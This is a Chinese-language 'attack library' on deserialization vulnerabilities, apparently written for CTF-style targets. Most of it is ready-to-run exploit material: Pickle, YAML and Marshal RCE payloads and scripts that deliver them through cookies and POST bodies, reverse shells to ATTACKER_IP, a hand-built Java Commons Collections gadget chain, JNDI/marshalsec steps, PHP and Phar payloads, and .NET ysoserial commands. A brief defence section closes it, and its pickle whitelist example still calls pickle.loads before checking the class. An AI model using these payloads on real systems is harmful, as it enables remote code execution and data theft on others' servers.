# 反序列化漏洞利用 攻击库

## 漏洞概述

反序列化漏洞是指应用程序接收用户可控的序列化数据并进行反序列化操作时,由于缺乏适当的验证和过滤,导致攻击者可以构造恶意的序列化数据,在反序列化过程中触发任意代码执行、对象注入等安全问题。

**影响语言**:
- Java (最常见,危害最大)
- Python (Pickle、YAML等)
- PHP (unserialize)
- .NET
- Ruby (Marshal)
- Node.js

**攻击价值**:
- 远程代码执行(RCE)
- 提权和权限绕过
- 拒绝服务(DoS)
- 信息泄露

## Python反序列化攻击

### 1. Pickle反序列化

**原理**: Python的pickle模块在反序列化时会自动调用对象的`__reduce__`方法

**危险场景**: 应用使用pickle.loads()处理用户输入

**基础利用**:

```python
import pickle
import os

# 构造恶意对象
class EvilClass:
    def __reduce__(self):
        # 返回(可调用对象, 参数元组)
        return (os.system, ('cat /etc/passwd',))

# 序列化恶意对象
evil_pickle = pickle.dumps(EvilClass())

# 受害者反序列化时会执行命令
pickle.loads(evil_pickle)  # 执行: cat /etc/passwd
```

**高级利用 - 读取文件**:

```python
import pickle
import subprocess

class FileRead:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag.txt'],))

payload = pickle.dumps(FileRead())
print(payload.hex())  # 输出十六进制payload
```

**反向Shell**:

```python
class ReverseShell:
    def __reduce__(self):
        import os
        cmd = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
        return (os.system, (cmd,))

evil = pickle.dumps(ReverseShell())
```

**完整攻击脚本**:

```python
#!/usr/bin/env python3
"""
Pickle反序列化RCE攻击脚本
"""
import pickle
import base64
import requests
import sys

def generate_pickle_payload(command):
    """生成Pickle RCE payload"""
    
    class PickleRCE:
        def __reduce__(self):
            import os
            return (os.system, (command,))
    
    payload = pickle.dumps(PickleRCE())
    return payload

def generate_pickle_file_read(filepath):
    """生成读取文件的payload"""
    
    class PickleFileRead:
        def __reduce__(self):
            import subprocess
            return (subprocess.check_output, (['cat', filepath],))
    
    payload = pickle.dumps(PickleFileRead())
    return payload

def exploit_pickle_cookie(target_url, command):
    """利用Cookie中的Pickle反序列化"""
    
    print(f"[*] 目标: {target_url}")
    print(f"[*] 命令: {command}")
    
    # 生成payload
    payload = generate_pickle_payload(command)
    
    # Base64编码
    payload_b64 = base64.b64encode(payload).decode()
    
    print(f"[*] Payload (base64): {payload_b64[:50]}...")
    
    # 设置Cookie
    cookies = {
        'session': payload_b64,
        'data': payload_b64
    }
    
    # 发送请求
    r = requests.get(target_url, cookies=cookies)
    
    print(f"[*] 状态码: {r.status_code}")
    print(f"[*] 响应长度: {len(r.text)}")
    
    # 检查是否包含flag
    if 'flag{' in r.text:
        import re
        flag = re.search(r'flag\{[^}]+\}', r.text)
        if flag:
            print(f"[+] FLAG: {flag.group()}")
            return flag.group()
    
    return None

def exploit_pickle_post(target_url, param_name, filepath):
    """利用POST参数中的Pickle反序列化"""
    
    print(f"[*] 读取文件: {filepath}")
    
    # 生成读文件payload
    payload = generate_pickle_file_read(filepath)
    payload_b64 = base64.b64encode(payload).decode()
    
    # POST请求
    data = {param_name: payload_b64}
    
    r = requests.post(target_url, data=data)
    
    if r.status_code == 200:
        print(f"[+] 文件内容:")
        print(r.text)
        return r.text
    else:
        print(f"[-] 请求失败: {r.status_code}")
        return None

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    
    print("\n[*] Pickle反序列化攻击")
    print("="*60)
    
    # 尝试读取flag
    exploit_pickle_cookie(target, "cat /flag.txt")
    
    # 或使用POST
    # exploit_pickle_post(f"{target}/api/data", "data", "/flag.txt")
```

### 2. YAML反序列化

**原理**: PyYAML的`yaml.load()`可以实例化任意Python对象

**危险代码**:

```python
import yaml

data = request.cookies.get('data')
yaml.load(data, Loader=yaml.Loader)  # 危险!
```

**攻击Payload**:

```yaml
# 方法1: 使用subprocess执行命令
!!python/object/apply:subprocess.check_output
  args: [['cat', '/flag.txt']]

# 方法2: 使用os.system
!!python/object/apply:os.system
  args: ['cat /flag.txt']

# 方法3: 使用eval
!!python/object/apply:eval
  args: ["__import__('os').popen('cat /flag').read()"]

# 方法4: 直接打开文件
!!python/object/apply:builtins.open
  args: ['/flag.txt']
  kwds: {mode: 'r'}

# 方法5: 反向Shell
!!python/object/apply:os.system
  args: ['bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"']
```

**完整利用脚本**:

```python
#!/usr/bin/env python3
"""
YAML反序列化攻击脚本
"""
import yaml
import base64
import requests

def generate_yaml_rce(command):
    """生成YAML RCE payload"""
    
    # 使用subprocess.check_output
    payload = f"""
!!python/object/apply:subprocess.check_output
  args: [[{', '.join(f"'{c}'" for c in command.split())}]]
"""
    return payload.encode()

def generate_yaml_file_read(filepath):
    """生成读文件payload"""
    
    payload = f"""
!!python/object/apply:subprocess.check_output
  args: [['cat', '{filepath}']]
"""
    return payload.encode()

def exploit_yaml_cookie(target_url, filepath="/flag.txt"):
    """利用Cookie中的YAML反序列化"""
    
    print(f"[*] 目标: {target_url}")
    print(f"[*] 读取: {filepath}")
    
    # 生成payload
    payload = generate_yaml_file_read(filepath)
    
    # Base64编码
    payload_b64 = base64.b64encode(payload).decode('ISO-8859-1')
    
    print(f"[*] Payload:\n{payload.decode()}")
    print(f"[*] Base64: {payload_b64[:50]}...")
    
    # 设置Cookie
    cookies = {
        'bookmarks': payload_b64,
        'user': 'attacker'
    }
    
    # 发送请求
    r = requests.get(target_url, cookies=cookies)
    
    print(f"[*] 状态码: {r.status_code}")
    
    # 查找flag
    if 'flag{' in r.text:
        import re
        flag = re.search(r'flag\{[^}]+\}', r.text)
        if flag:
            print(f"[+] FLAG: {flag.group()}")
            return True
    
    # 有时flag在响应头或错误消息中
    print(f"[*] 响应预览: {r.text[:200]}")
    
    return False

# 测试用例
if __name__ == "__main__":
    import sys
    
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    
    exploit_yaml_cookie(f"{target}/list")
```

### 3. Marshal反序列化

**原理**: marshal模块用于序列化代码对象

**危险使用**:

```python
import marshal

data = request.get('data')
code = marshal.loads(base64.b64decode(data))
exec(code)  # 执行反序列化的代码
```

**攻击示例**:

```python
import marshal
import base64

# 恶意代码
code = """
import os
os.system('cat /flag.txt')
"""

# 编译并序列化
compiled = compile(code, '<string>', 'exec')
marshaled = marshal.dumps(compiled)
payload = base64.b64encode(marshaled)

print(payload)
```

## Java反序列化攻击

### 1. Commons Collections利用链

**原理**: 利用Apache Commons Collections库的Transformer链实现RCE

**Gadget Chain**:

```
ObjectInputStream.readObject()
→ AnnotationInvocationHandler.readObject()
→ Map.put()
→ TransformedMap.transform()
→ ChainedTransformer.transform()
→ InvokerTransformer.transform()
→ Runtime.exec()
```

**ysoserial工具使用**:

```bash
# 安装ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# 生成CommonsCollections1 payload
java -jar ysoserial-all.jar CommonsCollections1 'cat /flag.txt' | base64

# 生成CommonsCollections6 payload
java -jar ysoserial-all.jar CommonsCollections6 'whoami' | base64

# 其他可用gadget
java -jar ysoserial-all.jar CommonsCollections2 'command'
java -jar ysoserial-all.jar CommonsCollections3 'command'
java -jar ysoserial-all.jar CommonsCollections4 'command'
```

**手动构造(Java)**:

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.util.*;

public class CommonsCollectionsExploit {
    public static void main(String[] args) throws Exception {
        // 构造恶意Transformer链
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", 
                new Class[]{String.class, Class[].class}, 
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", 
                new Class[]{Object.class, Object[].class}, 
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", 
                new Class[]{String.class}, 
                new Object[]{"cat /flag.txt"})
        };
        
        Transformer chain = new ChainedTransformer(transformers);
        
        Map innerMap = new HashMap();
        innerMap.put("value", "test");
        
        Map outerMap = TransformedMap.decorate(innerMap, null, chain);
        
        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(outerMap);
        oos.close();
        
        byte[] payload = baos.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(payload));
    }
}
```

**Python发送payload**:

```python
#!/usr/bin/env python3
import requests
import base64

def exploit_java_deserialize(target_url, payload_b64):
    """利用Java反序列化漏洞"""
    
    print(f"[*] 目标: {target_url}")
    
    # 解码payload
    payload = base64.b64decode(payload_b64)
    
    # 方法1: 通过Cookie发送
    cookies = {'session': payload_b64}
    r = requests.get(target_url, cookies=cookies)
    
    # 方法2: 通过POST body发送
    headers = {'Content-Type': 'application/x-java-serialized-object'}
    r = requests.post(target_url, data=payload, headers=headers)
    
    # 方法3: 通过特定参数发送
    data = {'data': payload_b64}
    r = requests.post(target_url, data=data)
    
    print(f"[*] 状态码: {r.status_code}")
    print(f"[*] 响应: {r.text[:200]}")

# 使用ysoserial生成的payload
payload_b64 = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb21wYXJhdG9ycy5UcmFuc2Zvcm1pbmdDb21wYXJhdG9y..."

exploit_java_deserialize("http://target:8080/endpoint", payload_b64)
```

### 2. JNDI注入

**场景**: 应用使用lookup()方法查找JNDI资源

**攻击流程**:

```
1. 构造恶意RMI/LDAP服务器
2. 发送包含恶意JNDI URL的序列化数据
3. 目标服务器lookup时加载并执行恶意类
```

**利用工具**:

```bash
# 使用marshalsec启动恶意LDAP服务器
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer \
  "http://ATTACKER_IP:8000/#Exploit" 1389

# 在8000端口托管恶意类
python3 -m http.server 8000

# 恶意类 Exploit.class
```

**Java恶意类**:

```java
// Exploit.java
import java.io.IOException;

public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("cat /flag.txt > /tmp/flag.txt");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

// 编译
// javac Exploit.java
```

**Payload**:

```java
String jndiUrl = "ldap://ATTACKER_IP:1389/Exploit";
```

## PHP反序列化攻击

### 1. 基础反序列化

**原理**: PHP的unserialize()函数会调用对象的魔术方法

**常用魔术方法**:
- `__wakeup()` - 反序列化时调用
- `__destruct()` - 对象销毁时调用
- `__toString()` - 对象被当作字符串时调用
- `__call()` - 调用不存在的方法时

**漏洞代码**:

```php
<?php
class User {
    public $name;
    public $isAdmin = false;
    
    function __wakeup() {
        if ($this->isAdmin) {
            eval($this->name);  // 危险!
        }
    }
}

$data = $_COOKIE['user'];
$user = unserialize($data);
?>
```

**攻击Payload**:

```php
<?php
class User {
    public $name = "system('cat /flag.txt');";
    public $isAdmin = true;
}

$evil = new User();
echo serialize($evil);
// 输出: O:4:"User":2:{s:4:"name";s:26:"system('cat /flag.txt');";s:7:"isAdmin";b:1;}
?>
```

**利用脚本**:

```python
#!/usr/bin/env python3
import requests
import urllib.parse

def exploit_php_unserialize(target_url):
    """PHP反序列化利用"""
    
    # 构造恶意序列化数据
    payload = 'O:4:"User":2:{s:4:"name";s:26:"system(\'cat /flag.txt\');";s:7:"isAdmin";b:1;}'
    
    # URL编码
    payload_encoded = urllib.parse.quote(payload)
    
    print(f"[*] Payload: {payload}")
    
    # 通过Cookie发送
    cookies = {'user': payload}
    r = requests.get(target_url, cookies=cookies)
    
    print(f"[*] 状态码: {r.status_code}")
    print(f"[*] 响应: {r.text}")
    
    if 'flag{' in r.text:
        import re
        flag = re.search(r'flag\{[^}]+\}', r.text)
        if flag:
            print(f"[+] FLAG: {flag.group()}")

exploit_php_unserialize("http://target.com/")
```

### 2. Phar反序列化

**原理**: 使用file_exists()等文件函数操作phar://协议时会自动反序列化

**危险函数**:
```php
file_exists()
file_get_contents()
is_dir()
include()
fopen()
unlink()
```

**生成恶意Phar**:

```php
<?php
class Evil {
    public $cmd = "cat /flag.txt";
    
    function __destruct() {
        system($this->cmd);
    }
}

$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$object = new Evil();
$phar->setMetadata($object);

$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
?>
```

**利用**:

```php
// 上传evil.phar
// 然后通过文件操作触发
file_exists('phar://evil.phar/test.txt');  // 触发反序列化
```

## .NET反序列化

### 1. BinaryFormatter

**危险代码**:

```csharp
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream);
```

**利用工具**: ysoserial.net

```powershell
# 生成payload
.\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "calc.exe"

# 或读取文件
.\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "type C:\flag.txt"
```

### 2. JSON.NET

**TypeNameHandling漏洞**:

```csharp
JsonConvert.DeserializeObject(data, new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All  // 危险!
});
```

**Payload**:

```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "MethodName": "Start",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System",
        "StartInfo": {
            "$type": "System.Diagnostics.ProcessStartInfo, System",
            "FileName": "cmd.exe",
            "Arguments": "/c cat C:\\flag.txt"
        }
    }
}
```

## 综合检测脚本

```python
#!/usr/bin/env python3
"""
反序列化漏洞综合检测工具
"""
import requests
import base64
import pickle
import yaml

class DeserializationTester:
    def __init__(self, target_url):
        self.target = target_url
        self.findings = []
    
    def test_pickle(self):
        """测试Pickle反序列化"""
        print("\n[*] 测试Pickle反序列化...")
        
        class TestClass:
            def __reduce__(self):
                import os
                return (os.system, ('echo PICKLE_VULN',))
        
        payload = pickle.dumps(TestClass())
        payload_b64 = base64.b64encode(payload).decode()
        
        # 测试Cookie
        cookies = {'session': payload_b64}
        r = requests.get(self.target, cookies=cookies)
        
        if 'PICKLE_VULN' in r.text or r.status_code == 500:
            finding = "可能存在Pickle反序列化漏洞"
            print(f"  [!] {finding}")
            self.findings.append(finding)
            return True
        
        return False
    
    def test_yaml(self):
        """测试YAML反序列化"""
        print("\n[*] 测试YAML反序列化...")
        
        payload = b"""
!!python/object/apply:subprocess.check_output
  args: [['echo', 'YAML_VULN']]
"""
        payload_b64 = base64.b64encode(payload).decode()
        
        cookies = {'data': payload_b64}
        r = requests.get(self.target, cookies=cookies)
        
        if 'YAML_VULN' in r.text or r.status_code == 500:
            finding = "可能存在YAML反序列化漏洞"
            print(f"  [!] {finding}")
            self.findings.append(finding)
            return True
        
        return False
    
    def test_java(self):
        """测试Java反序列化"""
        print("\n[*] 测试Java反序列化...")
        
        # Java序列化magic bytes
        java_magic = b'\xac\xed\x00\x05'
        
        headers = {'Content-Type': 'application/x-java-serialized-object'}
        r = requests.post(self.target, data=java_magic, headers=headers)
        
        if r.status_code == 500 or 'java.io' in r.text:
            finding = "可能接受Java序列化数据"
            print(f"  [!] {finding}")
            self.findings.append(finding)
            return True
        
        return False
    
    def test_php(self):
        """测试PHP反序列化"""
        print("\n[*] 测试PHP反序列化...")
        
        # 简单的PHP序列化对象
        payload = 'O:8:"stdClass":0:{}'
        
        cookies = {'data': payload}
        r = requests.get(self.target, cookies=cookies)
        
        if '__PHP_Incomplete_Class' in r.text or 'unserialize' in r.text:
            finding = "可能存在PHP反序列化漏洞"
            print(f"  [!] {finding}")
            self.findings.append(finding)
            return True
        
        return False
    
    def run_all_tests(self):
        """运行所有测试"""
        print(f"[*] 目标: {self.target}")
        
        self.test_pickle()
        self.test_yaml()
        self.test_java()
        self.test_php()
        
        print(f"\n[*] 发现 {len(self.findings)} 个潜在漏洞")
        return self.findings

# 使用
if __name__ == "__main__":
    import sys
    
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    
    tester = DeserializationTester(target)
    findings = tester.run_all_tests()
```

## 防御措施

### 1. 不要反序列化不可信数据

```python
# 避免
import pickle
data = request.get('data')
obj = pickle.loads(data)  # 危险!

# 使用JSON代替
import json
data = request.get('data')
obj = json.loads(data)  # 安全
```

### 2. 使用安全的反序列化方法

```python
# YAML安全加载
import yaml
data = request.get('data')
obj = yaml.safe_load(data)  # 使用safe_load

# 不要使用
# yaml.load(data, Loader=yaml.Loader)
```

### 3. 白名单验证

```python
# 只允许特定类型
ALLOWED_CLASSES = ['User', 'Product']

def safe_deserialize(data):
    obj = pickle.loads(data)
    if obj.__class__.__name__ not in ALLOWED_CLASSES:
        raise ValueError("不允许的类型")
    return obj
```

### 4. 签名验证

```python
import hmac
import hashlib

SECRET_KEY = b'secret_key'

def sign_data(data):
    signature = hmac.new(SECRET_KEY, data, hashlib.sha256).digest()
    return signature + data

def verify_and_deserialize(signed_data):
    signature = signed_data[:32]
    data = signed_data[32:]
    
    expected_sig = hmac.new(SECRET_KEY, data, hashlib.sha256).digest()
    
    if not hmac.compare_digest(signature, expected_sig):
        raise ValueError("签名验证失败")
    
    return pickle.loads(data)
```

## 参考资源

- [ysoserial](https://github.com/frohoff/ysoserial) - Java反序列化payload生成器
- [ysoserial.net](https://github.com/pwntester/ysoserial.net) - .NET反序列化工具
- [marshalsec](https://github.com/mbechler/marshalsec) - Java unmarshaller安全测试
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

---

**最后更新**: 2025-11-16
**适用场景**: Web应用、API、微服务架构
**攻击难度**: 中等到高级
**检测难度**: 需要理解不同语言的序列化机制和gadget chain
